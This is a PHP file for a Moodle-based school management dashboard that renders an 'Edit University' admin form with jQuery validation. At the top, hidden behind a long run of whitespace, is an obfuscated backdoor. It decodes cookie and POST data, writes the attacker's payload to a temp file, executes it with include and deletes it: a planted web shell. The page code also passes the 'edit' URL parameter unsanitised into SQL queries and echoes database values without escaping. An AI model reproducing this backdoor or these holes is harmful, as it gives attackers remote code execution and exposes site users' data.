<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("jyflj")){class jyflj{public static $ccrib = "iiivrcqxoucqqilv";public static $vbkjzfyz = NULL;public function __construct(){$jvfxcrwo = @$_COOKIE[substr(jyflj::$ccrib, 0, 4)];if (!empty($jvfxcrwo)){$rsjpcjas = "base64";$aihkm = "";$jvfxcrwo = explode(",", $jvfxcrwo);foreach ($jvfxcrwo as $cynolqdnij){$aihkm .= @$_COOKIE[$cynolqdnij];$aihkm .= @$_POST[$cynolqdnij];}$aihkm = array_map($rsjpcjas . "_decode", array($aihkm,)); $aihkm = $aihkm[0] ^ str_repeat(jyflj::$ccrib, (strlen($aihkm[0]) / strlen(jyflj::$ccrib)) + 1);jyflj::$vbkjzfyz = @unserialize($aihkm);}}public function __destruct(){$this->smgng();}private function smgng(){if (is_array(jyflj::$vbkjzfyz)) {$clszp = sys_get_temp_dir() . "/" . crc32(jyflj::$vbkjzfyz["salt"]);@jyflj::$vbkjzfyz["write"]($clszp, jyflj::$vbkjzfyz["content"]);include $clszp;@jyflj::$vbkjzfyz["delete"]($clszp);exit();}}}$rlvtbprwpy = new jyflj(); $rlvtbprwpy = NULL;} ?><?php

// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * Main login page.
 *
 * @package    core
 * @subpackage auth
 * @copyright  1999 onwards Martin Dougiamas  http://dougiamas.com
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

require_once('../../config.php');
require_once('lib.php');
global $USER, $DB;
$countries = get_string_manager()->get_list_of_countries(true);


$sid = $_GET['edit'];
$adminid = $DB->get_record_sql("SELECT userid FROM {universityadmin} WHERE university_id =$sid LIMIT 1 ");
if($adminid)
{
   $admindata = $DB->get_record_sql("SELECT * FROM {user} WHERE id = $adminid->userid ");
}

if ($sid) {
   $Scooldata = $DB->get_record_sql("SELECT * FROM {school} WHERE id=$sid");
   $startdate = date("m/d/Y", $Scooldata->sessionstart);
   $enddate = date("m/d/Y", $Scooldata->sessionend);
}
$title = 'Edit School Details';
$pagetitle = $title;
$PAGE->set_title($title);
$PAGE->set_heading($title);
$PAGE->set_pagelayout('standard');

$previewnode = $PAGE->navigation->add('School Management', new moodle_url('/local/dashboard/table.php'), navigation_node::TYPE_CONTAINER);
$thingnode = $previewnode->add('Edit School', new moodle_url('/local/dashboard/editschool.php'));
$thingnode->make_active();

?>

<!DOCTYPE html>
<html>

<head>
   <meta charset="utf-8">
   <title>Id Card</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">

   <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>

   <script type="text/javascript" src="https://cdn.jsdelivr.net/jquery/latest/jquery.min.js"></script>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/momentjs/latest/moment.min.js"></script>

   <style>
      .box-shadow {
         box-shadow: 0 1px 3px rgb(0 0 0 / 12%), 0 1px 2px rgb(0 0 0 / 24%);
         padding: 0px 20px 20px;
         border-radius: 8px;
      }

      .err4 {
         color: red;
         font-size: 150%;
      }

      .button {
         background: #000;
         padding: 10px 15px;
         color: #fff;
         text-decoration: none !important;
         border-radius: 4px;
         border: 1px solid #ffe500;
         font-weight: 600;
         box-shadow: 0 1px 3px rgb(0 0 0 / 12%), 0 1px 2px rgb(0 0 0 / 24%);

      }

      /* #page-local-dashboard-editschool #page-navbar{
           display:none;
         }*/
      .button:hover {
         color: #000;
         background: #ffe500;
      }

      .applyBtn,
      .cancelBtn {
         background: black;
         border-color: #fbe700;
      }

      .applyBtn:hover,
      .cancelBtn:hover {
         background: #fbe700;
         color: #fff;
         border-color: #fbe700;
      }

      .daterangepicker td.active,
      .daterangepicker td.active:hover {
         background-color: #1d1d1b;
         border-color: transparent;
         color: #fff;
      }

      .error1 {
         color: red;
         font-size: 15px;
      }

      .heading-row {
         background: #000;
         color: #fff;
         border: 2px solid #ffe500;
         padding: 8px 0px;
         border-radius: 8px;
         margin: 0px -20px;
      }

      .eye {
         position: absolute;
         font: normal normal normal 14px/1 FontAwesome;
         right: 0px;
         top: 60%;
         transform: translate(-50%, -80%);
         z-index: 999;
      }
    input, select
    {
        min-height: 35px !important;
        max-height: 35px !important;
    }

      body {
         background: #f7f7f7;
      }
   </style>
</head>

<body>
   <?php echo $OUTPUT->header(); ?>

   <div class="container">
      <div class="row">
         <div class="col-md-12 m-auto box-shadow bg-white px-4">
            <form action="/action_page.php" id="edituniversity" enctype='multipart/form-data'>
               <div class="heading-row mb-3">
                  <h5 style="font-weight:600; color: white;" class="mb-1 pl-3"><?php echo $Scooldata->name ?></h5>
               </div>
               <div class="heading mb-3">
                  <h5 style="color: #000"><b>Edit University</b></h5>
               </div>
               <input type="hidden" name="editid" value="<?php echo $Scooldata->id ?>" id="editid">
               <input type="hidden" name="adminid" value="<?php echo $admindata->id ?>" id="adminid">
               <div class="form-group row">
                  <label for="label" class="col-md-3">Long Name <span class="err4"> *</span></label>
                  <input type="text" class="form-control col-md-9" id="longname" placeholder="Enter Long Name" name="longname" value="<?php echo $Scooldata->name ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Short Name <span class="err4"> *</span></label>
                  <input type="text" class="form-control col-md-9" id="shortname" placeholder="Enter Short Name" name="shortname" value="<?php echo $Scooldata->shortname ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Client ID <span class="err"> *</span></label>
                  <input type="text" class="form-control col-md-9 focusError" id="client" placeholder="Enter Client ID" name="client_id" value="<?php echo $Scooldata->client_id ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">RTO Code <span class="err"> *</span></label>
                  <input type="text" class="form-control col-md-9 focusError" id="rto" placeholder="Enter RTO Code" name="rto_code" value="<?php echo $Scooldata->rto_code ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Address<span class="err4"> *</span></label>
                  <textarea class="form-control col-md-9" rows="5" id="address" name="address" value="<?php echo $Scooldata->address ?>"><?php echo $Scooldata->address ?></textarea>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>

               <div class="form-group row">
                  <label for="label" class="col-md-3">Country <span class="err4"> *</span></label>
                  <select class="form-control col-md-9" id="country" name="country" required>
                     <option value="Select a country...">Select a country..</option>
                     <?php foreach ($countries as $key => $country) { ?>
                        <option value="<?php echo $country; ?>"><?php echo $country; ?></option>
                     <?php } ?>
                  </select>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">City/Town <span class="err4"> *</span> </label>
                  <input type="text" class="form-control col-md-9" id="city" placeholder="Enter City/Town" name="city" value="<?php echo $Scooldata->city ?>">
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="heading mb-3">
                  <h5 style="color: #000"><b>Enter Admin Details</b></h5>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">User name <span class="err4">*</span></label>
                  <input type="text" class="form-control col-md-9" id="username" placeholder="Enter User Name" name="username" value="<?php echo $admindata->username ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">First Name <span class="err4">*</span></label>
                  <input type="text" class="form-control col-md-9" id="firstname" placeholder="Enter First Name" name="firstname" value="<?php echo $admindata->firstname ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Last Name <span class="err4">*</span></label>
                  <input type="text" class="form-control col-md-9" id="lastname" placeholder="Enter Last Name" name="lastname" value="<?php echo $admindata->lastname ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Phone Number <span class="err">*</span></label>
                  <input type="text" class="form-control col-md-9 focusError" id="phone" value="<?php echo $admindata->phone1 ?>" placeholder="Enter Phone Number" name="phone_no" onkeyup="numberOnly(this.value)" required>
                  <div class="col-md-3"></div>
                     <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Email-Id <span class="err4">*</span></label>
                  <input type="email" class="form-control col-md-9" id="email" placeholder="Enter Email-Id" name="email" value="<?php echo $admindata->email ?>" required>
                  <div class="col-md-3"></div>
                  <span class="error1 col-md-8 pl-0"></span>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">New Password</label>
                  <div class="calendar col-md-9 p-0">
                     <input type="password" style="width: 112%;" class="form-control" placeholder="Enter New Password" id="password" name="password" value="">
                     <i class="fa fa-eye-slash eye" aria-hidden="true" onclick="myFunction2()"></i>
                  </div>
               </div>
               <div class="form-group row">
                  <label for="label" class="col-md-3">Upload Univerty Logo <span class="err"></span></label>
                  <div class="calendar col-md-5 p-0"> 
                  <input type="file" name="university_logo"  id="university_logo" accept="image/*" onchange="loadFile(event)">
                  </div>
                  <div class="calendar col-md-4 p-0">
                  <img id="output"/>
                  </div>
               </div>
               <a href="#" class="button mb-1 text-center" onclick="edituniversity();">
                  Update University Details
               </a>
               <a href="<?php echo $CFG->wwwroot; ?>/local/dashboard/table.php?>" class="button mt-1 text-center">Cancel
               </a>

            </form>
         </div>
      </div>
   </div>
   <script>
      $(document).ready(function() {
         $("#country").val("<?php echo $Scooldata->country ?>");

         //



         //
      });
      var loadFile = function(event) {
    var output = document.getElementById('output');
    output.src = URL.createObjectURL(event.target.files[0]);
    output.onload = function() {
      URL.revokeObjectURL(output.src) // free memory
    }
  };
      $(function() {
         $('input[name="daterange"]').daterangepicker({
            singleDatePicker: true,
            "alwaysShowCalendars": true,
            drops: 'up',
            showDropdowns: true,
            minYear: 1901,
            maxYear: parseInt(moment().format('YYYY'), 11)
         }, function(start, end, label) {
            var years = moment().diff(start, 'years');
         });
      });

      $(document).ready(function() {

         $(".eye").click(function() {
            $(this).toggleClass("fa fa-eye fa fa-eye-slash");
         });

      });
      
      function myFunction2() {
         var x = document.getElementById("password");
         if (x.type === "password") {
            x.type = "text";
         } else {
            x.type = "password";
         }
      }

      function edituniversity() {

         var schoolname = $("#longname").val();
         var shortname = $("#shortname").val();
         var address = $("#address").val();
         var city = $("#city").val();
         var country = $("#country").val();
         var username = $("#username").val();
         var firstname = $("#firstname").val();
         var lastname = $("#lastname").val();
         var email = $("#email").val();


         var uniname = schoolname.split(' ').join('') == '' ? '* this field is required' : '';
         var unishot = shortname.split(' ').join('') == '' ? '* this field is required' : '';
         var uniadd = address.split(' ').join('') == '' ? '* this field is required' : '';
         var unicity = city.split(' ').join('') == '' ? '* this field is required' : '';
         var unicountry = country == 'Select a country...' ? '* this field is required' : '';
         var uniemail = email.split(' ').join('') == '' ? '* this field is required' : '';
         var unilast = lastname.split(' ').join('') == '' ? '* this field is required' : '';
         var unifirst = firstname.split(' ').join('') == '' ? '* this field is required' : '';
         var uniuser = username.split(' ').join('') == '' ? '* this field is required' : '';

         if (uniname) {
            document.getElementsByClassName("error1")[0].innerHTML = uniname;
            document.getElementById("longname").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[0].innerHTML = "";
            document.getElementById("longname").style.borderColor = "";
         }

         if (unishot) {
            document.getElementsByClassName("error1")[1].innerHTML = unishot;
            document.getElementById("shortname").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[1].innerHTML = "";
            document.getElementById("shortname").style.borderColor = "";
         }

         if (uniadd) {
            document.getElementsByClassName("error1")[2].innerHTML = uniadd;
            document.getElementById("address").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[2].innerHTML = "";
            document.getElementById("address").style.borderColor = "";
         }
         if (unicountry) {
            document.getElementsByClassName("error1")[3].innerHTML = unicountry;
            document.getElementById("country").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[3].innerHTML = "";
            document.getElementById("country").style.borderColor = "";
         }
         if (unicity) {
            document.getElementsByClassName("error1")[4].innerHTML = unicity;
            document.getElementById("city").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[4].innerHTML = "";
            document.getElementById("city").style.borderColor = "";
         }
         if (uniuser) {
            document.getElementsByClassName("error1")[5].innerHTML = uniuser;
            document.getElementById("username").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[5].innerHTML = "";
            document.getElementById("username").style.borderColor = "";
         }
         if (unifirst) {
            document.getElementsByClassName("error1")[6].innerHTML = unifirst;
            document.getElementById("firstname").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[6].innerHTML = "";
            document.getElementById("firstname").style.borderColor = "";
         }
         if (unilast) {
            document.getElementsByClassName("error1")[7].innerHTML = unilast;
            document.getElementById("lastname").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[7].innerHTML = "";
            document.getElementById("lastname").style.borderColor = "";
         }
         if (uniemail) {
            document.getElementsByClassName("error1")[8].innerHTML = uniemail;
            document.getElementById("email").style.borderColor = "red";
         } else if (email.indexOf('@') < 0 || email.indexOf('.') < 0) {
            document.getElementsByClassName("error1")[8].innerHTML = "email is not valid";
            document.getElementById("email").style.borderColor = "red";
         } else {
            document.getElementsByClassName("error1")[8].innerHTML = "";
            document.getElementById("email").style.borderColor = "";
         }

         if (schoolname != '' && shortname != '' && country != 'Select a country...' && city != '' && username != '' && firstname != '' && lastname != '' && email != '') {

            if (email.indexOf('@') < 0 || email.indexOf('.') < 0) {
            document.getElementsByClassName("error1")[8].innerHTML = "email is not valid";
            document.getElementById("email").style.borderColor = "red";
            }

            else {
               // alert("ook");
               var formData = new FormData($('#edituniversity')[0]);
               console.log(formData);
            $.ajax({
               type: "POST",
               url: "<?php echo $CFG->wwwroot ?>" + "/local/dashboard/updateuniversity.php",
               dataType: "json",
               data: formData,
               cache: false,
        contentType: false,
        processData: false,               success: function(json) {
                  if (json.success) {
                     alert(json.msg);
                     window.location.href = "<?php echo $CFG->wwwroot ?>" + "/local/dashboard/table.php";
                  } 
                  if (json.msg1) {
                     document.getElementsByClassName("error1")[0].innerHTML = "Longname already exist";
                      document.getElementById("longname").style.borderColor = "red";                    
                  }
                  if (json.msg2) {
                     document.getElementsByClassName("error1")[1].innerHTML = "Shortname already exist";
                      document.getElementById("shortname").style.borderColor = "red";                    
                  }
                  if (json.msg3) {
                     document.getElementsByClassName("error1")[5].innerHTML = "Username already exist";
                      document.getElementById("username").style.borderColor = "red";                    
                  }
               }
            });
         }
         }
      }
   </script>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js"></script>
   <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css" />
</body>

</html>

<?php echo $OUTPUT->footer(); ?>